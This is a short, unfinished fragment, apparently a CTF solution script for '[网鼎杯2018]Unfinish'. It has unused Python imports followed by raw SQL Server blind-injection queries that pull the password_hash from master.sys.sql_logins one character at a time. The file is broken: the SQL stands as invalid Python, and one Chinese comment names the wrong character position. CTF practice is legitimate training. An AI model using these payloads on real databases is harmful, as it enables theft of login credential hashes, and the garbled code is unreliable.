# [网鼎杯2018]Unfinish
import requests
import logging
import re
from time import sleep

select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 1, 1))=48  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为0
select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 2, 1))=49  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为1

